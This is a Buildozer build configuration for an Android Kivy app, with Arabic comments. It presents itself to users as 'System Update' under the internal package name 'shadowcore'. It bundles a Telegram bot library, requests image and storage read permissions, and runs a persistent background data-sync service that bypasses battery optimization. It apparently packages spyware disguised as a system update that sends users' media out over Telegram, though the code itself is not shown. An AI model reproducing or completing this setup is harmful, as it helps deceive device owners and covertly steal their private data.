[app]
# (str) اسم التطبيق الذي سيظهر للمستخدم
title = System Update

# (str) اسم الحزمة (يجب أن يطابق الكود في main.py)
package.name = shadowcore

# (str) نطاق الحزمة
package.domain = org.test

# (str) مكان الكود المصدري
source.dir = .

# (list) الملفات المطلوب تضمينها
source.include_exts = py,png,jpg,kv,atlas

# (str) إصدار التطبيق
version = 1.0

# (list) المكتبات المطلوبة (تم إضافة telebot و requests)
requirements = python3,kivy,pyjnius,requests,pyTelegramBotAPI

# (str) اتجاه الشاشة
orientation = portrait

# (bool) الشاشة الكاملة
fullscreen = 0

# (list) الأذونات (تم إضافة إذن مزامنة البيانات وتجاوز البطارية)
android.permissions = INTERNET, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, FOREGROUND_SERVICE_DATA_SYNC, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS

# (int) API المستهدف (33 مثالي لأندرويد 13 و 14)
android.api = 33

# (int) أقل API يدعمه التطبيق
android.minapi = 21

# (list) المعماريات المدعومة
android.archs = arm64-v8a, armeabi-v7a

# (list) الخدمات (ربط ملف service.py)
# ملاحظة: حرف S الكبير في Service ضروري جداً
services = Service:service.py

# (bool) إبقاء الشاشة مضيئة أثناء التحميل
android.presplash_color = #000000

# (list) ميزات Manifest الإضافية (تجاوز الخطأ في تشغيل الخدمة)
android.manifest.attributes = android:requestLegacyExternalStorage="true"

# (str) تعريف نوع الخدمة في أندرويد 14
android.service_type = dataSync

[buildozer]
# مستوى التسجيل (2 يعطي تفاصيل كاملة في حال وجود خطأ بالبناء)
log_level = 2

# التحذير عند التشغيل كجذر
warn_on_root = 1
